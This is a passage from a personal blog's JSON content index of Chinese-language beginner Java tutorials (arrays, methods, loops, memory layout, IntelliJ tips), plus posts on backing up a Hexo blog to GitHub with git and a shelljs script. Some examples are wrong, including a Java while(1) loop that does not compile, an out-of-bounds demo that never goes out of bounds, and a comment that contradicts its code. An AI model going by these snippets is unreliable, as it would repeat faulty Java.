&#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组作为方法参数","slug":"java00021数组作为方法参数","date":"2020-02-08T10:12:58.000Z","updated":"2020-02-08T10:17:30.536Z","comments":true,"path":"2020/02/08/java00021数组作为方法参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00021数组作为方法参数/","excerpt":"","text":"数组可以作为方法的参数 当调用方法的时候,向方法的小括号进行传参,传递进去的其实是数组的地址值. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package xiaochenyan.top;public class test019 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,234,12,4,124,21,315,15,1235,461,235,1,34632,135,124151,32515,612,351,35&#125;; arraySort(array); // 把数组地址值传递给形参 arrayOut(array); // 把数组地址值传递给形参 funFZ(array); // 把数组地址值传递给形参 arrayOut(array); // 把数组地址值传递给形参 &#125; //冒泡法排序 public static void arraySort(int[] array) &#123; for(int i = 0;i &lt; array.length - 1;i++) &#123; for(int j = 0;j &lt; array.length - (i + 1);j++) &#123; if(array[j] &lt; array[j + 1] ) &#123; int temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; &#125; &#125; &#125; &#125; //数组遍历输出 public static void arrayOut(int[] array) &#123; for (int i : array) &#123; System.out.print(i + \" \" ); &#125; System.out.println(\"\"); System.out.println(\"===================================\"); &#125; //数组反转 public static void funFZ(int[] array) &#123; int max = array.length - 1; int min = 0; for(;min &lt; max;min++,max--) &#123; int temp = array[min]; array[min] = array[max]; array[max] = temp; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"获取数组的最大值","slug":"java00019获取数组的最大值","date":"2020-02-08T07:37:28.000Z","updated":"2020-02-08T09:32:21.502Z","comments":true,"path":"2020/02/08/java00019获取数组的最大值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00019获取数组的最大值/","excerpt":"","text":"12345678910111213141516public class test018 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,2,21,41,1235,21,12,52,2351,234,12,234,23,123412,12&#125;; int max = array[0]; for (int i = 1;i &lt; array.length;i++) &#123; if(max &lt; array[i]) // 如果max 小于 array[i],那么将array[i]的值,赋值给max &#123; max = array[i]; &#125; &#125; System.out.println(\"array数组的最大值:\" + max); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组的遍历输出","slug":"java00020数组的遍历输出","date":"2020-02-08T07:25:09.000Z","updated":"2020-02-08T09:32:08.533Z","comments":true,"path":"2020/02/08/java00020数组的遍历输出/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00020数组的遍历输出/","excerpt":"","text":"遍历数组,说的就是对数组当中的每一个元素进行逐一处理.默认的处理方式就是打印输出. 123456789101112131415161718public class test017 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,2,324,12,234,15,12,51,234,21&#125;; //第一种方法,将array的每一个元素逐次赋值给i for (int i : array) &#123; System.out.println(i); &#125; System.out.println(\"======================\"); //第二种方法,将i当做array的下标,通过i的不断增加,来打印array数组,且i小于array.length for (int i = 0; i &lt; array.length;i++) &#123; System.out.println(array[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组元素反转","slug":"java00018数组元素反转","date":"2020-02-08T07:13:31.000Z","updated":"2020-02-08T09:09:01.983Z","comments":true,"path":"2020/02/08/java00018数组元素反转/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00018数组元素反转/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class test019 &#123; public static void main(String[] args) &#123; int[] array = &#123;1,234,12,4,124,21,315,15,1235,461,235,1,34632,135,124151,32515,612,351,35&#125;; //数组排序 arraySort(array); //数组遍历输出 arrayOut(array); //数组反转 funFZ(array); //数组遍历输出 arrayOut(array); &#125; //冒泡法排序 public static void arraySort(int[] array) &#123; for(int i = 0;i &lt; array.length - 1;i++) &#123; for(int j = 0;j &lt; array.length - (i + 1);j++) &#123; if(array[j] &lt; array[j + 1] ) &#123; int temp = array[j]; array[j] = array[j + 1]; array[j + 1] = temp; &#125; &#125; &#125; &#125; //数组遍历输出 public static void arrayOut(int[] array) &#123; for (int i : array) &#123; System.out.print(i + \" \" ); &#125; System.out.println(\"\"); System.out.println(\"===================================\"); &#125; //数组反转 public static void funFZ(int[] array) &#123; int max = array.length - 1; int min = 0; for(;min &lt; max;min++,max--) &#123; int temp = array[min]; array[min] = array[max]; array[max] = temp; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"获取数组长度","slug":"java00017获取数组长度","date":"2020-02-08T07:13:31.000Z","updated":"2020-02-08T07:16:52.078Z","comments":true,"path":"2020/02/08/java00017获取数组长度/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00017获取数组长度/","excerpt":"","text":"如何获取数组的长度,格式: 数组名称.length 这将会得到一个int数字,代表数组的长度. 数组一旦创建,程序运行期间,长度不可发生改变. 123456789101112131415161718192021/*如何获取数组的长度,格式:数组名称.length这将会得到一个int数字,代表数组的长度.数组一旦创建,程序运行期间,长度不可发生改变. */public class test016 &#123; public static void main(String[] args) &#123; int[] arrayA = &#123;12,12,324,5,15,12,535,13&#125;; //获取数组arrayA的长度 System.out.println(\"arrayA数组的长度:\" + arrayA.length); int[] arrayB = new int[3]; //获取数组arrayB的长度 System.out.println(\"arrayB数组的长度:\" + arrayB.length); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"常见问题 空指针异常","slug":"java00016常见问题-空指针异常","date":"2020-02-08T06:59:12.000Z","updated":"2020-02-08T07:06:45.688Z","comments":true,"path":"2020/02/08/java00016常见问题-空指针异常/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00016常见问题-空指针异常/","excerpt":"","text":"所有的引用类型变量,都可以赋值为一个null值.但是代表其中什么都没有. 数组必须进行new初始化才能使用其中的元素 如果只是赋值了一个null,没有进行new创建, 那么将会发生: 空指针异常 NullPointerException 原因:忘了补new 解决:补上new 1234567891011121314151617181920public class test015 &#123; /* 所有的引用类型变量,都可以赋值为一个null值.但是代表其中什么都没有. 数组必须进行new初始化才能使用其中的元素 如果只是赋值了一个null,没有进行new创建, 那么将会发生: 空指针异常 NullPointerException 原因:忘了补new 解决:补上new */ public static void main(String[] args) &#123; int[] array = null; //array = new int[3]; System.out.println(array[0]);//空指针异常 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组索引越界异常","slug":"java00015数组索引越界异常","date":"2020-02-08T06:46:01.000Z","updated":"2020-02-08T06:59:30.245Z","comments":true,"path":"2020/02/08/java00015数组索引越界异常/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00015数组索引越界异常/","excerpt":"","text":"数组索引从0开始,一直到数组长度-1为止. 如果访问数组元素的时候,索引编号并不存在,那么将会发生数组索引越界异常 提示:ArrayIndexOutOfBoundsException 原因: 索引编号写错了 解决: 修改成为存在的正确索引编号. 1234567891011121314151617181920212223package xiaochenyan.top;public class test014 &#123; /* 数组索引从0开始,一直到数组长度-1为止. 如果访问数组元素的时候,索引编号并不存在,那么将会发生数组索引越界异常 ArrayIndexOutOfBoundsException 原因: 索引编号写错了 解决: 修改成为存在的正确索引编号. */ public static void main(String[] args) &#123; int[] array = new int[4]; array[0] = 1; array[1] = 2; array[2] = 3; array[3] = 4; // 数组越界,发生异常,导致错误 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"两个引用指向同一个数组","slug":"java00014两个引用指向同一个数组","date":"2020-02-07T20:05:38.000Z","updated":"2020-02-07T20:08:12.994Z","comments":true,"path":"2020/02/08/java00014两个引用指向同一个数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00014两个引用指向同一个数组/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132package xiaochenyan.top;public class test013 &#123; public static void main(String[] args) &#123; int[] arrayA = new int[3]; System.out.println(arrayA); System.out.println(arrayA[0]); System.out.println(arrayA[1]); System.out.println(arrayA[2]); System.out.println(&quot;====================&quot;); arrayA[1] = 10; arrayA[2] = 20; System.out.println(arrayA); System.out.println(arrayA[0]); System.out.println(arrayA[1]); System.out.println(arrayA[2]); System.out.println(&quot;====================&quot;); int[] arrayB = arrayA; System.out.println(arrayB); System.out.println(arrayB[0]); System.out.println(arrayB[1]); System.out.println(arrayB[2]); System.out.println(&quot;====================&quot;); arrayB[1] = 10; arrayB[2] = 20; System.out.println(arrayB); System.out.println(arrayB[0]); System.out.println(arrayB[1]); System.out.println(arrayB[2]); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"两个数组的内存图","slug":"java00013两个数组的内存图","date":"2020-02-07T19:28:56.000Z","updated":"2020-02-07T19:35:14.584Z","comments":true,"path":"2020/02/08/java00013两个数组的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00013两个数组的内存图/","excerpt":"","text":"1234567891011121314package xiaochenyan.top;public class test012 &#123; public static void main(String[] args) &#123; int[] array1 = new int[3]; //创建一个包含三个元素的array1数组 System.out.println(array1); //打印array1的地址 array1[1] = 2; //修改array1[1]的值 array1[2] = 100; //修改array1[2]的值 int[] array2 = new int[3]; //创建一个包含三个元素的array2数组 System.out.println(array2); //打印array2的地址 array2[1] = 300; //修改array2[1]的值 array2[2] = 25; //修改array2[2]的值 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"一个数组的内存图","slug":"java00012一个数组的内存图","date":"2020-02-07T18:51:11.000Z","updated":"2020-02-07T18:55:45.444Z","comments":true,"path":"2020/02/08/java00012一个数组的内存图/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/08/java00012一个数组的内存图/","excerpt":"","text":"12345678910111213public class test011 &#123; public static void main(String[] args) &#123; int[] array = new int[3];//从堆区创建一个包含三个元素的数组 System.out.println(array); array[1] = 2; //从堆区把array[1]的值修改成2 array[2] = 200;//从堆区把array[2]的值修改成100 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Java中的内存划分","slug":"java00011Java中的内存划分","date":"2020-02-07T15:10:32.000Z","updated":"2020-02-07T15:42:07.946Z","comments":true,"path":"2020/02/07/java00011Java中的内存划分/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/07/java00011Java中的内存划分/","excerpt":"","text":"Java的内存需要划分成为5个部分 1.栈（Stack）: 存放的都是方法中的局部变量。方法的运行一定要在栈当中运行。 局部变量：方法的参数，或者是方法{}内部的变量 作用域：一但超出作用域，立刻从栈内存中消失。 2.堆（Heap）：凡是new出来的内存，都在堆区中。 堆内存里面的内存都有一个内存地址值：16进制 堆内存里面的数据，都有默认值。规则： 如果是整数 默认值为0 如果是浮点数 默认值为0.0 如果是字符 默认值为‘\\u0000’ 如果是布尔 默认值为false 如果是引用类型 默认值为null 3.方法区（Method Area）：存储.class相关的信息，包含方法的信息 4.本地方法栈（Native Method Stack）：与操作系统相关。 5.寄存器（PC Register）：与CPU相关。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"数组","slug":"java00010数组","date":"2020-02-05T21:39:02.000Z","updated":"2020-02-07T11:50:26.499Z","comments":true,"path":"2020/02/06/java00010数组/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/06/java00010数组/","excerpt":"","text":"数组 数组的概念 ​ 数组是引用数据类型 ​ 类型要统一 ​ 数组的长度在运行期间不可以改变 初始化 动态初始化（指定长度） ​ 数据类型[] 数组名称 = new 数据类型[数组长度] ​ 使用动态初始化数组的时候,其中的元素将会自动拥有一个默认值.规则如下: 如果是整数类型,那么默认值为0; 如果是浮点类型,那么默认值为0.0; 如果是字符类型,那么默认值为’\\u0000’ u代表Unicode ,0000代表十六进制数; 如果是布尔类型,那么默认值为false; 如果是引用类型,那么默认值为null(空常量); 注意事项 静态初始化其实也有默认值的过程,只不过系统自动马上将默认值替换成为了大括号当中的具体数值. 123456789101112131415class test010 &#123; public static void main(String[] args) &#123; int[] arr1 = new int[10]; int[] arr2 = new int[]&#123;1,2,3,4&#125;; System.out.println(arr1[0]);//默认值为0; System.out.println(arr1[1]);//默认值为0; System.out.println(arr1[2]);//默认值为0; /*数组赋值*/ arr1[1] = 100; System.out.println(arr1[1]); &#125;&#125; 拆分格式 数据类型[] 数组名; 数组名 = new 数据类型名[]{元素1,元素2,…} 数组名 = new 数据类型名[长度]; 123456789public class test010 &#123; public static void main(String[] args) &#123; int[] arr; arr = new int[]&#123;10,2,3,4&#125;; //arr = new int[10]; &#125;&#125; 静态初始化(指定内容) ​ 数据类型[] 数组名 = new 数据类型[] {元素1,元素2,…,元素n}; 1234567public class test010 &#123; public static void main(String[] args) &#123; int[] arr = new int[]&#123;1,2,3,4&#125;; &#125;&#125; 省略格式 ​ 数据类型[] 数组名 = {元素1,元素2,…,元素n}; 1234567public class test010 &#123; public static void main(String[] args) &#123; int[] arr = &#123;1,2,3,4&#125;; &#125;&#125; 拆分格式 ​ 不能再用省略格式 ​ 数据类型[] 数组名; ​ 数组名 = new 数据类型名[]{元素1,元素2,…} 1234567public class test010 &#123; public static void main(String[] args) &#123; int[] arr; arr = new int[]&#123;1,2,3,4,5&#125;; &#125;&#125; 访问数组元素 ​ 直接打印数组名,会打印数组内存地址哈希值 ​ 格式 : 数组名[索引值] ​ 索引值从0开始到数组长度-1结束 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; int[] arr; arr = new int[]&#123;1,2,3,4,5&#125;; System.out.println(arr);//打印数组内存地址哈希值 System.out.println(arr[0]);//使用数组下标访问数组元素 for(int i = 0; i &lt; arr.length;i++)//数组下标不大于数组的长度 &#123; System.out.println(arr[i]); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"方法定义和使用","slug":"java00009方法定义和使用","date":"2020-02-05T21:13:51.000Z","updated":"2020-02-05T21:34:04.363Z","comments":true,"path":"2020/02/06/java00009方法定义和使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/06/java00009方法定义和使用/","excerpt":"","text":"方法 方法定义 ​ 以public static开头 ​ public static 类型 方法名() ​ { ​ } 12345678910public class test010 &#123; public static void main(String[] args) &#123; System.out.println(\"\"); &#125; public static void funName(int a) //方法定义 &#123; //语句块 &#125;&#125; 方法的三种调用格式 单独调用 ​ 方法名（[参数]） 12345678910public class test010 &#123; public static void main(String[] args) &#123; funName(20); System.out.println(\"\"); &#125; public static void funName(int a) //方法定义 &#123; //语句块 &#125;&#125; 打印调用 ​ System.out.println(方法名（[参数]）) 12345678910public class test010 &#123; public static void main(String[] args) &#123; System.out.println( funName(20) ); &#125; public static int funName(int a) //方法定义 &#123; return a + 10; &#125;&#125; 赋值调用 ​ int a = 方法名（[参数]） 12345678910public class test010 &#123; public static void main(String[] args) &#123; int a = funName(20);//赋值调用 &#125; public static int funName(int a) //方法定义 &#123; return a + 10; &#125;&#125; 方法分为两种 参数 ​ 有参数 ​ 无参数 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; &#125; public static int funName(int a) //有参数方法定义 &#123; return a + 10; &#125; public static int funName() //无参数方法定义 &#123; return 10; &#125;&#125; 返回值 ​ 有返回值 ​ 无返回值 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; &#125; public static int funName(int a) //有返回值方法定义 &#123; return a + 10; &#125; public static void funName() //无返回值方法定义 &#123; return ; &#125;&#125; 方法注意事项 方法应该定义类中，不能定义在方法中 方法定义没有前后顺序 方法定义之后不会自动执行，需要手动调用 如果方法有返回值，必须写上 return 返回值 返回的数据必须要和返回值类型一致 对于void返回值类型，可以只写return； 一个方法可以有多个return，但只能执行其中一个 方法重载Overload 如果功能相同，参数不同，可以使用方法重载 特征 ​ 方法名要相同 ​ 参数个数不同 ​ 参数类型不同 ​ 类型名 参数顺序不同 12345678910111213141516171819202122232425public class test010 &#123; public static void main(String[] args) &#123; &#125; public static int funName(int a) &#123; return a + 10; &#125; public static int funName() //参数个数不同 &#123; return 10; &#125; public static int funName(int a,int b) //参数个数不同 &#123; return a + b; &#125; public static int funName(double a,int b) //参数类型不同 &#123; return (int)a + b; &#125; public static int funName(int a,double b) //参数顺序不同 &#123; return a + (int)b; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"集成开发环境","slug":"java00008集成开发环境","date":"2020-02-05T20:49:36.000Z","updated":"2020-02-05T21:13:05.461Z","comments":true,"path":"2020/02/06/java00008集成开发环境/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/06/java00008集成开发环境/","excerpt":"","text":"集成开发软件 IntelliJ IDEA ​ 官方网站 www.jetbrains.com ​ 先新建项目,再新建模块,然后新建包,最后新建源文件 ​ 输入psvm 回车 ​ 自动生成public static void main(String[] args) { ​ 会自动保存 快捷键 ​ alt + 4 显示输出框 ​ shift + f10 编译运行 ​ alt + enter 自动修复代码 ​ ctrl + y 删除光标所在行 ​ ctrl + d 复制光标当前行,插入光标位置下面 ​ ctrl+alt + L 格式化代码 ​ ctrl + / 单行注释,再按一次取消单行注释 ​ Ctrl+Shift +/ 多行注释 ​ alt+ins 自动生成代码 ​ alt+shift +上下箭头 移动当前代码行 ​ shift + f6 一个改全部改 ​ ctrl + 鼠标左键 转到方法定义处 设置 ​ 设置字体 ​ file-&gt;settings…-&gt; editor-&gt; Font-&gt;size 设置自动提示快捷键 ​ file-&gt;settings…-&gt;点击齿轮-&gt;Duplicate 复制一份 -&gt;Main menu -&gt; code -&gt; completion -&gt;basic 项目和模块的关闭和导入 关闭 file -&gt; close project 导入 Open -&gt; 选择项目文件 有小黑块的 然后一直下一步 模块 移除 ​ Remove Moudle 导入 ​ File -&gt; Project Structure -&gt; Import Moudle -&gt;一直选next -&gt;OK","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"基本结构","slug":"java00007基本结构","date":"2020-02-05T13:07:02.000Z","updated":"2020-02-05T13:36:13.790Z","comments":true,"path":"2020/02/05/java00007基本结构/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/05/java00007基本结构/","excerpt":"","text":"顺序结构 ​ 从上到下,顺序执行 选择结构 单if语句 ​ if(条件表达式){语句块} 123456789public class test010 &#123; public static void main(String[] args) &#123; int a = 10,b = 11; if(a &lt; b) &#123; System.out.println(a); &#125; &#125;&#125; 标准if else语句 ​ if(条件表达式){语句块;}else{语句块} 1234567891011public class test010 &#123; public static void main(String[] args) &#123; int a = 10,b = 11; if(a &lt; b) &#123; System.out.println(a); &#125;else&#123; System.out.println(b); &#125; &#125;&#125; 多层if语句 ​ if(条件表达式){语句块;}else if(条件表达式){语句块}else{语句块} 12345678910111213public class test010 &#123; public static void main(String[] args) &#123; int a = 10,b = 11,c =12; if(a &gt; b &amp;&amp; a &gt; c) &#123; System.out.println(a); &#125;else if(b &gt; c &amp;&amp; b &gt; a)&#123; System.out.println(b); &#125;else&#123; System.out.println(c); &#125; &#125;&#125; switch ​ 选择对应于的常量,并执行对应常量的语句 ​ switch(表达式) { ​ case 常量1: ​ 语句; ​ break; ​ case 常量2: ​ 语句; ​ break; ​ default: ​ 语句; } 1234567891011121314151617public class test010 &#123; public static void main(String[] args) &#123; char c = 'A'; switch(c) &#123; case 'A': System.out.println(\"X&gt;=90\"); break; case 'B': System.out.println(\"80&gt;=X&lt;90\"); break; default: System.out.println(\"X&lt;79\"); &#125; &#125;&#125; 常量类型 整型 ​ byte,char,short,int 引用数据类型 ​ String,enum ​ 常量值不能重复 循环结构 for循环语句 for(变量初始化;条件判断;改变变量值) { 语句块; } 12345678public class test010 &#123; public static void main(String[] args) &#123; for(int i = 0;i &lt; 10;i++) &#123; System.out.println(i); &#125; &#125;&#125; while循环语句 while(条件) { 语句块; } 12345678910public class test010 &#123; public static void main(String[] args) &#123; int i = 0; while(i &lt; 10) &#123; System.out.println(i); i++; &#125; &#125;&#125; do while循环语句 初始化表达式 do{ ​ 语句块; }while(条件表达式); 123456789public class test010 &#123; public static void main(String[] args) &#123; int i = 0; do&#123; System.out.println(i); &#125;while(i++ &lt; 10); &#125;&#125; break ​ 中止循环 continue ​ 结束本次循环 死循环 ​ java可以有死循环 12345678public class test010 &#123; public static void main(String[] args) &#123; while(1) &#123; //我是死循环 &#125; &#125;&#125; 循环嵌套 ​ 一个循环体嵌套着另一个循环体这就叫做循环嵌套 123456789101112public class test010 &#123; public static void main(String[] args) &#123; for(int i = 0;i &lt; 10;i++) &#123; for(int j = 0;j &lt; 10;j++) &#123; System.out.print(\"*\"); &#125; System.out.println(\"\"); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"使用hexo+GitHub搭建的个人博客 文件备份","slug":"使用hexo-GitHub搭建的个人博客-文件备份","date":"2020-02-05T12:10:54.000Z","updated":"2020-02-05T12:19:28.220Z","comments":true,"path":"2020/02/05/使用hexo-GitHub搭建的个人博客-文件备份/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/05/使用hexo-GitHub搭建的个人博客-文件备份/","excerpt":"","text":"使用hexo+GitHub搭建的个人博客 文件备份 1.在GitHub中创建 hexo 分支来存储本地 markdown 文件 在本地文件根目录创建 .gitignore 文件，若存在修改为 123456.DS_Store*.lognode_modules/.deploy*/public/db.json 在本地文件根目录中初始化 git 1git init 创建分支hexo 1git checkout -b hexo 提交到仓库，需要注意的事在提交之前要把themes目录下主题中的 .git 文件夹重命名或者删除，不然的话 git 会把主题当做子模块来处理。 12git add .git commit -m &apos;init&apos; 添加远程仓库 1git remote add origin git@github.com:MrWangwj/MrWangwj.github.io.git push 到远程分支 1git push origin hexo 2.在另一台电脑上使用 首先要克隆下这个项目 1git clone git@github.com:MrWangwj/MrWangwj.github.io.git 进入博客目录 1cd MrWangwj.github.io.git 切换到博客文件分支 1git checkout -b hexo origin/hexo 安装hexo 1npm install hexo --save 然后编辑、查看 12hexo g //编译hexo s //浏览器查看 localhost:4000 提交 git，若在提交过程中出现 ERROR Deployer not found: git 可执行 npm install hexo-deployer-git --save 后重新提交。 1hexo d 在写了新 markdown 文件后提交 git 123git add .git commit -m &apos;新增博客&apos;git push origin hexo 到此，我们以后只要写完博客发布后记得 push 一下就能实现备份了。","categories":[{"name":"githubHexo","slug":"githubHexo","permalink":"https://xiaowuyoucy.github.io/categories/githubHexo/"}],"tags":[]},{"title":"自动备份Hexo源文件","slug":"自动备份Hexo源文件","date":"2020-02-05T10:16:47.000Z","updated":"2020-02-05T11:11:10.150Z","comments":true,"path":"2020/02/05/自动备份Hexo源文件/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/05/自动备份Hexo源文件/","excerpt":"","text":"自动备份Hexo源文件 前言 配置一个Hexo博客往往需要作者倾注大量心血，而如果哪天电脑坏了或者换电脑导致Hexo源文件丢失的话就是一件比较杯具的事。因此本文给出了一种自动备份Hexo源文件到Github的方法，能够在执行hexo deploy命令后自动执行Git命令以推送Hexo源文件到Github仓库。 原理 NodeJS的事件监听机制能够监听Hexo的事件。通过查询Hexo文档，找到了Hexo的主要事件，见下表： 事件名 描述 deployBefore 在部署完成前发布。 deployAfter 在部署成功后发布。 exit 在Hexo 结束前发布。 generateBefore 在静态文件生成前发布。 generateAfter 在静态文件生成后发布。 new 在文章文件建立后发布。该事件返回文章参数。 processBefore 在处理原始文件前发布。此事件会返回一个地址，代表 Box（Box）的根目录。 processAfter 在原始文件处理后发布。此事件会返回一个地址，代表 Box（Box）的根目录。 ready 在初始化完成后发布。 通过查询上表发现，我们可以通过监听Hexo的deployAfter事件，待部署成功后自动运行Git备份命令，从而达到自动备份的目的。 实现 将Hexo目录加入Git仓库 首先需要在Github创建一个新的repository,名字与本地Hexo文件夹同名即可。然后进入本地Hexo文件夹，按顺序执行以下命令： 123git initgit remote add origin git@github.com:yourname/hexo.gitgit pull origin master 再每次执行hexo generate命令时，public/、.deploy、\\*.log文件夹会重写更新，因此需要在.gitignore文件（如果没有，手动创建一个）中写入public/、.deploy、\\*.log以忽略这几个目录，加快备份的速度。 然后再顺序执行以下命令，将文件推送到Github： 123git add .git commit -m &quot;备份hexo源码文件&quot;git push origin master 这三行命令便是手动推送本地文件到Github的命令,我们接下来要做的是让NodeJS监听到Hexo的deployAfter事件后自动执行上述命令。 安装shelljs模块 键入以下命令即可 1npm install --save shelljs 加入自动执行脚本 在Hexo根目录的scripts文件夹（没有就自己创建一个）下新建一个js文件，文件名随意。然后加入以下代码： 1234567891011121314151617181920212223242526272829303132333435require('shelljs/global');try &#123; hexo.on('deployAfter', function() &#123;//当deploy完成后执行备份 run(); &#125;);&#125; catch (e) &#123; console.log(\"产生了一个错误&lt;(￣3￣)&gt; !，错误详情为：\" + e.toString());&#125;function run() &#123; if (!which('git')) &#123; echo('Sorry, this script requires git'); exit(1); &#125; else &#123; echo(\"======================Auto Backup Begin===========================\"); cd('path to hexo'); //此处修改为Hexo根目录路径 if (exec('git add --all').code !== 0) &#123; echo('Error: Git add failed'); exit(1); &#125; if (exec('git commit -am \"Form auto backup script\\'s commit\"').code !== 0) &#123; echo('Error: Git commit failed'); exit(1); &#125; if (exec('git push origin master').code !== 0) &#123; echo('Error: Git push failed'); exit(1); &#125; echo(\"==================Auto Backup Complete============================\") &#125;&#125; 注意上述代码中第29行需要修改为自己Hexo文件夹的绝对路径。 效果 如果脚本运行成功，会得到类似以下的效果： 1234567891011121314======================Auto Backup Begin===========================cd: no such file or directory: C:/Users/17810/OneDrive/hexowarning: LF will be replaced by CRLF in source/_posts/自动备份Hexo源文件.md.The file will have its original line endings in your working directory.warning: LF will be replaced by CRLF in source/_posts/自动备份Hexo源文件.md.The file will have its original line endings in your working directory.[master a6cb4c7] Form auto backup script&apos;s commit 1 file changed, 153 insertions(+)warning: LF will be replaced by CRLF in source/_posts/自动备份Hexo源文件.md.The file will have its original line endings in your working directory.To git@github.com:JacobZjw/hexo.git 0beaf4c..a6cb4c7 master -&gt; master==================Auto Backup Complete============================ 懒癌患者的小福利 在hexo中，我们常常使用hexo new命令来新建文章。然鹅，当我们的文章较多时，我们往往需要在成堆的文章中找到刚刚生成的文件，然后使用Markdown编辑器打开。作为一名懒癌患者怎么可能让自己如此受累。 于是，我找到了Hexo作者给出的解决办法 和上面类似，在scripts文件夹中创建一个js文件，添加以下代码： 1234567891011var spawn = require('child_process').exec;// Hexo 2.x 用户复制这段hexo.on('new', function(path)&#123; spawn('start \"markdown编辑器绝对路径.exe\" ' + path);&#125;);// Hexo 3 用户复制这段hexo.on('new', function(data)&#123; spawn('start \"markdown编辑器绝对路径.exe\" ' + data.path);&#125;); 保存并退出脚本之后，在命令行中键入： 1hexo new &quot;auto open editor test&quot; 是不是就顺利的自动打开了自动生成的md文件啦~","categories":[{"name":"githubHexo","slug":"githubHexo","permalink":"https://xiaowuyoucy.github.io/categories/githubHexo/"}],"tags":[]},{"title":"JDK9的JShell-编译器的两点优化","slug":"java00006JDK9的JShell-编译器的两点优化","date":"2020-02-04T00:17:40.000Z","updated":"2020-02-04T00:36:20.957Z","comments":true,"path":"2020/02/04/java00006JDK9的JShell-编译器的两点优化/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00006JDK9的JShell-编译器的两点优化/","excerpt":"","text":"JDK9的JShell 什么时候会用到 JShell 工具呢，当我们编写的代码非常少的时候，而又不愿意编写类，main方法，也不愿意去编译和运 行，这个时候可以使用JShell工具。 启动JShell工具，在DOS命令行直接输入JShell命令。 打开cmd ​ 输入jshell ​ 退出/exit 编译器的两点优化 byte,short,char类型右侧没有超过本身范围,会自动强制转换类型 byte a = 12 常量优化 1 + 1常量表达式 在编译时会计算结果,而不是在运行时计算 12345public class test010 &#123; public static void main(String[] args) &#123; byte a = 12 //隐式的把12从int类型转换为byte类型 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java方法","slug":"java00005方法","date":"2020-02-04T00:02:04.000Z","updated":"2020-02-04T00:15:05.122Z","comments":true,"path":"2020/02/04/java00005方法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/02/04/java00005方法/","excerpt":"","text":"方法 定义 ​ public static void 方法名称(){语句块} ​ 方法的定义是无序性的 ​ 不能嵌套定义方法 命名方法 ​ 小驼峰式法 方法调用 格式 ​ 方法名称(); 12345678910111213public class test009 &#123; public static void main(String[] args) &#123; System.out.println(intAdd(10,20));//方法调用 &#125; //方法定义 public static int intAdd(int a,int b) &#123; return a + b; 